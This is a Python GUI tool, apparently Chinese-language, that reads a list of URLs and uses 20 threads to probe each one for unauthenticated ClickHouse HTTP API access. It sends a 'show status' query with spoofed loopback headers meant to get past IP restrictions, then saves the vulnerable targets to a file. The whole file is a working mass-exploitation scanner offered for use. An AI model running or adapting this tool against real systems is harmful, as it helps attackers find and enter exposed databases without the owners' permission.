import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def clickhouse_unauthorized_visit_exp(url):
    poc = r"""/?query=show%20status"""
    url = url + poc
    headers = {
        "Upgrade-Insecure-Requests":"1",
        "x-forwarded-for":"127.0.0.1",
        "x-originating-ip":"127.0.0.1",
        "x-remote-ip":"127.0.0.1",
        "x-remote-addr":"127.0.0.1"
    }
    try:
        res = requests.get(url, headers=headers,verify=False,timeout=3)
        if "Aborted_clients" in res.text:
            clickhouse_unauthorized_visit_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            clickhouse_unauthorized_visit_text.see(END)
            with open ("存在ClickHouse API 数据库接口未授权访问漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            clickhouse_unauthorized_visit_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            clickhouse_unauthorized_visit_text.see(END)
    except Exception as err:
        clickhouse_unauthorized_visit_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        clickhouse_unauthorized_visit_text.see(END)
def get_clickhouse_unauthorized_visit_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def clickhouse_unauthorized_visit_gui():
    clickhouse_unauthorized_visit = tk.Tk()
    clickhouse_unauthorized_visit.geometry("910x450")
    clickhouse_unauthorized_visit.title("ClickHouse API 数据库接口未授权访问漏洞一把梭")
    clickhouse_unauthorized_visit.resizable(0, 0)
    clickhouse_unauthorized_visit.iconbitmap('logo.ico')
    global clickhouse_unauthorized_visit_text
    clickhouse_unauthorized_visit_text = scrolledtext.ScrolledText(clickhouse_unauthorized_visit,width=123, height=25)
    clickhouse_unauthorized_visit_text.grid(row=0, column=0, padx=10, pady=10)
    clickhouse_unauthorized_visit_text.see(END)
    addrs = get_clickhouse_unauthorized_visit_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(clickhouse_unauthorized_visit_exp, addr)
    clickhouse_unauthorized_visit.mainloop()